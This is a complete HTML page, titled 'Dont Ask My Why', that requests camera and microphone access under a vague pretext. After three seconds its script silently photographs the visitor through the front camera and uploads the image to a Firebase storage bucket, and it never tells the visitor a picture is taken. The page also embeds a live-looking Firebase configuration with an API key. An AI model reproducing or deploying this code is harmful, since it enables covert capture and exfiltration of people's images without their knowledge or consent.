<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dont Ask My Why</title>
    <link rel="icon" href="data:,">
    <style>
        body {
            background-color: #000;
            color: #fff;
            text-align: center;
            font-family: Arial, sans-serif;
        }
        #permissions-message {
            margin-top: 20px;
            font-size: 18px;
        }
        #request-permissions {
            display: block;
            margin: 20px auto;
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            background-color: #1e90ff;
            color: white;
            border: none;
            border-radius: 5px;
        }
        #video {
            display: none;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <h1>Welcome to Dont Ask My Why</h1>
    <div id="permissions-message">
        To proceed, we need access to your microphone (it won't be used) and camera.
    </div>
    <button id="request-permissions">Grant Permissions</button>
    <video id="video" autoplay playsinline></video>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
        import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-storage.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCSmicQncJhWtvEekSLNQtvWM6fFr0cuRM",
            authDomain: "html-7fd9b.firebaseapp.com",
            projectId: "html-7fd9b",
            storageBucket: "html-7fd9b.appspot.com",
            messagingSenderId: "1022361191925",
            appId: "1:1022361191925:web:5bf0fb4023990d83aa0cbc"
        };

        const app = initializeApp(firebaseConfig);
        const storage = getStorage(app);

        function uploadImage(imageData) {
            const storageRef = ref(storage, 'Zeyad/image_' + Date.now() + '.png');
            uploadString(storageRef, imageData, 'data_url')
                .then(() => {
                    console.log('Uploaded a blob or file!');
                })
                .catch((error) => {
                    console.error('Error uploading image:', error);
                });
        }

        document.getElementById('request-permissions').addEventListener('click', () => {
            // Request microphone access first
            navigator.mediaDevices.getUserMedia({ audio: true })
                .then(() => {
                    console.log('Microphone access granted (not used).');
                    // Now request camera access
                    return navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: { ideal: "user" }, 
                            width: { ideal: 1920 },
                            height: { ideal: 1080 }
                        }
                    });
                })
                .then(stream => {
                    console.log('Camera access granted.');
                    // Display the video feed
                    const videoElement = document.getElementById('video');
                    videoElement.style.display = 'block';
                    videoElement.srcObject = stream;

                    const canvas = document.createElement('canvas');
                    const context = canvas.getContext('2d');
                    canvas.width = 1920;
                    canvas.height = 1080;

                    // Capture the image after 3 seconds
                    setTimeout(() => {
                        context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                        const imageData = canvas.toDataURL('image/png');
                        uploadImage(imageData);
                        stopVideo(stream);  // Stop the video stream after capturing the image
                    }, 3000);  // 3 seconds delay before taking a picture
                })
                .catch(error => {
                    console.error('Error accessing camera or microphone:', error);
                    alert('Permission was denied or there was an error accessing your microphone or camera.');
                });
        });

        function stopVideo(stream) {
            const tracks = stream.getTracks();
            tracks.forEach(track => track.stop());
        }
    </script>
</body>
</html>
